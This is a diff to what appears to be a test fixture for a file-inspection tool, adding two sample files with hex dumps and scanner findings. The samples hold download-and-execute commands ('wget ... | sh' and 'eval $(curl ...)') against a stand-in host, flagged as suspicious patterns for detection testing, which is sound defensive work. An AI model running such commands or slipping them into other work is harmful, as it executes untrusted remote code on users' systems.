@@ -284,6 +284,58 @@
    "findings": []
   },
   {
+   "name": "steps.txt",
+   "hex": "7468656e2072756e3a2077676574202d714f2d2068747470733a2f2f6578616d706c652e696e76616c69642f78207c2073680a",
+   "info": {
+    "size": 51,
+    "size_human": "51 B",
+    "extension": ".txt",
+    "detected_kind": "unknown",
+    "detected_via": "heuristic",
+    "description": "Unrecognized file format",
+    "is_text": true,
+    "encoding": "ascii",
+    "text_sample": "then run: wget -qO- https://example.invalid/x | sh\n",
+    "hex_preview": "00000000  74 68 65 6e 20 72 75 6e 3a 20 77 67 65 74 20 2d  then run: wget -\n00000010  71 4f 2d 20 68 74 74 70 73 3a 2f 2f 65 78 61 6d  qO- https://exam\n00000020  70 6c 65 2e 69 6e 76 61 6c 69 64 2f 78 20 7c 20  ple.invalid/x | \n00000030  73 68 0a                                         sh.",
+    "suggested_action": "TextView doesn't natively handle this format. Ask the chat agent (Ctrl+J) — it can identify likely tools and write a TextView script to handle this extension going forward."
+   },
+   "binary": false,
+   "findings": [
+    {
+     "severity": "warning",
+     "category": "suspicious_pattern",
+     "description": "remote-shell pipe",
+     "detail": "downloads + executes a script in one step — near `then run: wget -qO- https://example.invalid/x | sh `"
+    }
+   ]
+  },
+  {
+   "name": "install",
+   "hex": "23212f62696e2f73680a6576616c2024286375726c202d732068747470733a2f2f6578616d706c652e696e76616c69642f656e76290a",
+   "info": {
+    "size": 54,
+    "size_human": "54 B",
+    "extension": "",
+    "detected_kind": "script",
+    "detected_via": "magic",
+    "description": "Shebang script",
+    "is_text": true,
+    "encoding": "ascii",
+    "text_sample": "#!/bin/sh\neval $(curl -s https://example.invalid/env)\n",
+    "hex_preview": "00000000  23 21 2f 62 69 6e 2f 73 68 0a 65 76 61 6c 20 24  #!/bin/sh.eval $\n00000010  28 63 75 72 6c 20 2d 73 20 68 74 74 70 73 3a 2f  (curl -s https:/\n00000020  2f 65 78 61 6d 70 6c 65 2e 69 6e 76 61 6c 69 64  /example.invalid\n00000030  2f 65 6e 76 29 0a                                /env).",
+    "suggested_action": "TextView doesn't natively handle this format. Ask the chat agent (Ctrl+J) — it can identify likely tools and write a TextView script to handle this extension going forward."
+   },
+   "binary": false,
+   "findings": [
+    {
+     "severity": "warning",
+     "category": "suspicious_pattern",
+     "description": "eval-of-remote-content",
+     "detail": "executes whatever a remote URL returns — near `#!/bin/sh eval $(curl -s https://`"
+    }
+   ]
+  },
+  {
    "name": "readme.md",
    "hex": "636166c3a920e280942072c3a973756dc3a9206e6f7465730a",
    "info": {
